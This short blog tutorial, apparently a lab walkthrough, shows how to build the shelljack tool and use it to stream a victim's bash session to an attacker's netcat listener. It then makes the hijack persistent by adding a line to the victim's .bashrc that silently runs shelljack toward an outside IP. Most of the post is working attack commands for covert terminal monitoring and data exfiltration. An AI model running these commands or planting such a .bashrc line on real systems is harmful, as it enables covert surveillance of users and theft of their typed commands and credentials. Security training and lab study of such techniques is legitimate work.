---
title: Persistent monitoring
published: true
---

Today we will be using shelljack to monitor the bash of a victim with persistence.

## [](#header-2)Setting up the lab

We will need an attacking machine with netcat installed and a victim machine with git and [Shelljack](https://github.com/emptymonkey/shelljack).

To install shelljack on the victim's machine:

```bash
git clone https://github.com/emptymonkey/ptrace_do.git
cd ptrace_do
make
cd ..

git clone https://github.com/emptymonkey/ctty.git
cd ctty
make
cd ..

git clone https://github.com/emptymonkey/shelljack.git
cd shelljack
make
```

## [](#header-2)Simple attack

We have everything ready, now we are going to test that everything is ok before creating the persistence.

In the attacker's machine we set up a listener:

```bash
nc -lvp 9999
```

Now in the victim's machine we have to know the PID of the tty and execute shelljack:

```bash
tty
./shelljack -n Attacker IP:9999 $$
```

![POC](https://github.com/M4luk0/m4luk0.github.io/blob/master/images/victim_poc.png)

Now when the victim writes a command, we can see it in our machine.

Victim:

![POC](https://github.com/M4luk0/m4luk0.github.io/blob/master/images/victim_poc_1.png)

Attacker:

![POC](https://github.com/M4luk0/m4luk0.github.io/blob/master/images/attacker_poc_1.png)

## [](#header-2)Applying persistence

To apply the persistence we have to modify .bashrc in the victim's machine and add this:

```bash
tty &>/dev/null; /home/code/shelljack/shelljack -n 192.168.3.3:9999 $$ &>/dev/null
```
